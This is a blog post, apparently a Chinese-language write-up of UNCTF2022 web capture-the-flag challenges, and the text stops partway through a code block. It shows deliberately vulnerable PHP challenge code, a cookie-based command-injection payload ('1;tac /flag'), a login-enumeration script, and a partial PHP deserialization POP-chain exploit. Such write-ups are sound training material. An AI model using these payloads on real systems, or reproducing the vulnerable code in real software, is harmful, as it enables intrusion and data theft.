<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>UNCTF2022-WP - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="UNCTF2022-WP - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/03/02/UNCTF2022-WP/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T10:30:24.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">UNCTF2022-WP</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezgame"><a href="#ezgame" class="headerlink" title="ezgame"></a>ezgame</h2><p>一道js题目，直接在源码中搜索到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var _0x313bce = [&#x27;86VkibmA&#x27;, &#x27;fe7b163f8d&#x27;, &#x27;6833565vBFVDj&#x27;, &#x27;23742ODGjjF&#x27;, &#x27;unctf&#123;c5f9&#x27;, &#x27;d3&#125;&#x27;, &#x27;1335DfKYdi&#x27;, &#x27;6442920PCnqhb&#x27;, &#x27;781140poNcpx&#x27;, &#x27;a27d-6f88-&#x27;, &#x27;795305dViflS&#x27;, &#x27;1569524rbiRmt&#x27;, &#x27;49fb-a510-&#x27;, &#x27;88IpXszc&#x27;, &#x27;13033ieCwIU&#x27;, &#x27;6GgaKPA&#x27;];</span><br></pre></td></tr></table></figure>
<p>可以看到有unctf的字样，根据格式8-4-4-12组合一下即可得到flag</p>
<h2 id="我太喜欢bilibili大学啦"><a href="#我太喜欢bilibili大学啦" class="headerlink" title="我太喜欢bilibili大学啦"></a>我太喜欢bilibili大学啦</h2><p>这题一开始也有问题，上报后放了个修复版本<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668562436885-835178e9-ec2d-4ba7-bca7-648432c32a25.png#averageHue=%23c6a372&clientId=u7fe30119-07b5-4&from=paste&height=864&id=u1a8a3c4b&name=image.png&originHeight=1080&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=140065&status=done&style=none&taskId=u99f21824-b45c-4560-8500-ea1a825976b&title=&width=1536" alt="image.png"><br>开始为phpinfo界面，搜索到一个hint：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668562456955-07c64dee-2004-4691-93b3-c9e210524f20.png#averageHue=%23db9b53&clientId=u7fe30119-07b5-4&from=paste&height=55&id=u3b18ad61&name=image.png&originHeight=69&originWidth=731&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3575&status=done&style=none&taskId=u9e1e99bd-046c-419f-bea1-e5702508505&title=&width=584.8" alt="image.png"><br>解码之后为：<br><code>admin_unctf.php</code>：<br>访问：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668562488522-4b4c0031-224f-4b31-b3e5-7a051f062fc9.png#averageHue=%23e8c188&clientId=u7fe30119-07b5-4&from=paste&height=178&id=u48db4c00&name=image.png&originHeight=223&originWidth=1408&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19476&status=done&style=none&taskId=u40f54509-e7ea-49eb-ae18-6c9a8edb9b4&title=&width=1126.4" alt="image.png"><br>标头给出了hint2：<code>unctf2022/unctf2022</code><br>登录进去为题目入口：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;FLAG=nonono&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;username or password is empty&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&quot;unctf2022&quot;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="string">&quot;unctf2022&quot;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        @<span class="title function_ invoke__">system</span>(<span class="string">&quot;ping &quot;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;username or password error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:<code>1;tac /flag</code>,这里要url编码，放在cookie里，参数为cmd</p>
<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668562621661-90fd9c32-3981-4927-8287-f04bded60e13.png#averageHue=%23fdfdfc&clientId=u7fe30119-07b5-4&from=paste&height=203&id=u3cf49078&name=image.png&originHeight=254&originWidth=887&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11002&status=done&style=none&taskId=u616ea0a5-e031-4bf6-b35b-2e7d41fd0f6&title=&width=709.6" alt="image.png"><br>源代码放了个学号提示，输入进去显示登录成功，fuz发现存在遍历现象<br>每一次返回flag的一个字母，写个脚本:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668571141316-8bdd5ef3-b7b8-424a-9772-5b8e9f7c3f34.png#averageHue=%23343230&clientId=u75b61d75-48df-4&from=paste&height=31&id=uf78ba613&name=image.png&originHeight=39&originWidth=400&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5723&status=done&style=none&taskId=u9c8606ea-da83-486b-9c5f-ccd498561e6&title=&width=320" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author：Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://8bd37e89-73ba-4eb2-8b4c-331ae2aabf68.node.yuzhian.com.cn/index.php&quot;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">        <span class="keyword">if</span> i&lt;<span class="number">10</span>:</span><br><span class="line">            i=<span class="string">&#x27;0&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;202001<span class="subst">&#123;i&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="string">f&quot;202001<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        string = <span class="built_in">str</span>(r.text)</span><br><span class="line">        string = <span class="built_in">list</span>(string)</span><br><span class="line">        res+=string[<span class="number">504</span>]</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668562741490-bc537b8a-bafc-4726-be90-faf143339056.png#averageHue=%23c0e2e5&clientId=u7fe30119-07b5-4&from=paste&height=281&id=u40833a28&name=image.png&originHeight=351&originWidth=1158&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69482&status=done&style=none&taskId=u62a4d44d-55ba-4863-9101-49277803b63&title=&width=926.4" alt="image.png"><br>首先要知道入口要加个index.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]==<span class="number">0</span>&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]!==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key1&quot;</span>])&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key2&quot;</span>]))&#123;</span><br><span class="line">            <span class="variable">$key1</span>=<span class="variable">$_POST</span>[<span class="string">&quot;key1&quot;</span>];</span><br><span class="line">            <span class="variable">$key2</span>=<span class="variable">$_POST</span>[<span class="string">&quot;key2&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$key1</span>!==<span class="variable">$key2</span>&amp;&amp;<span class="title function_ invoke__">sha1</span>(<span class="variable">$key1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$key2</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>]))&#123;</span><br><span class="line">                    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|txt|cat|tac|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">                        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;有手就行&lt;/br&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;老套路了&lt;/br&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;很简单的，很快就拿flag了~_~&lt;/br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;百度就能搜到的东西&lt;/br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;easy 不 easy ,baby 真 baby,都是玩烂的东西，快拿flag！！！&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>不太难只能说，放payload：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668562987052-f6c67be2-8336-48b9-a6ef-8379d424d3f3.png#averageHue=%23989898&clientId=u7fe30119-07b5-4&from=paste&height=679&id=u6d34a4d9&name=image.png&originHeight=849&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68481&status=done&style=none&taskId=u2e861806-e604-4619-9138-0d0df4727ff&title=&width=1536" alt="image.png"><br>这个应该是真的flag吧？好像是改了一次flag，之前做出来flag我不记得长这样，我是在phpinfo搜索到了，也在flag.txt读了一下，都不是这个，不太清楚哦，谁让你喜欢改题目</p>
<h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>额，这题不好评价<br>先上船个图片再抓个包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668563185509-2c3eb72c-4947-4392-acf5-f5f188fc4924.png#averageHue=%23f8f8f8&clientId=u7fe30119-07b5-4&from=paste&height=450&id=u32bd9665&name=image.png&originHeight=562&originWidth=1293&originalType=binary&ratio=1&rotation=0&showTitle=false&size=137878&status=done&style=none&taskId=u0f68b4e2-99da-4852-979e-1df48b67894&title=&width=1034.4" alt="image.png"><br>简单的MIME验证罢了：<br>之后去马的地方：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668563355445-9e4e85e4-f36a-41ce-8d40-f34cda05c655.png#averageHue=%23f4f4f4&clientId=u7fe30119-07b5-4&from=paste&height=173&id=ud82aa3a7&name=image.png&originHeight=216&originWidth=1361&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17180&status=done&style=none&taskId=ue75b2ba0-eb90-410f-9411-fb78d1cc9ff&title=&width=1088.8" alt="image.png"></p>
<h2 id="302与深大"><a href="#302与深大" class="headerlink" title="302与深大"></a>302与深大</h2><p>重定向题，在点击靶机链接的时候抓包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668563397257-c33fdc8d-e53c-4e8b-a1db-4f87f2efecec.png#averageHue=%23f7f7f7&clientId=u7fe30119-07b5-4&from=paste&height=322&id=ub25cddf3&name=image.png&originHeight=402&originWidth=1334&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59198&status=done&style=none&taskId=ub3443561-639d-459a-84c4-862207f3204&title=&width=1067.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668563428927-d476ae9d-bbaa-4b65-8901-3364f561687e.png#averageHue=%23f6f5f5&clientId=u7fe30119-07b5-4&from=paste&height=338&id=uc6163328&name=image.png&originHeight=423&originWidth=1265&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74578&status=done&style=none&taskId=u775e71c0-f025-458a-b4e9-8963e6d7299&title=&width=1012" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668563593967-49e4119f-9d81-48a2-8f5d-1c155ead28b6.png#averageHue=%23edecec&clientId=u7fe30119-07b5-4&from=paste&height=48&id=u08facf7b&name=image.png&originHeight=60&originWidth=229&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3825&status=done&style=none&taskId=uf4991308-cf2e-44e2-9c6d-a239d60a763&title=&width=183.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668563587968-0e276311-707f-4160-9bb3-544331307e92.png#averageHue=%23f3f3f3&clientId=u7fe30119-07b5-4&from=paste&height=86&id=u4448c461&name=image.png&originHeight=107&originWidth=712&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15935&status=done&style=none&taskId=ue415c567-2591-47c8-a10c-f7d1e71f50c&title=&width=569.6" alt="image.png"></p>
<h2 id="ezunseri"><a href="#ezunseri" class="headerlink" title="ezunseri"></a>ezunseri</h2><p>反序列化pop构造：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;1!5!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="string">&quot;test123&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot; JUST FOR FUN&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;UNCTF&quot;</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name.<span class="variable language_">$this</span>-&gt;code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code = <span class="string">&#x27;3.1415926&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;key-&gt;name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[pop]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Login</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目触发pop链的思路很简单：<br><code>login::__destruct-&gt;Exec::__get-&gt;Test::__tostring-&gt;Exec::__invoke</code><br>pop构造：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;3.1415926&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name.<span class="variable language_">$this</span>-&gt;code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span 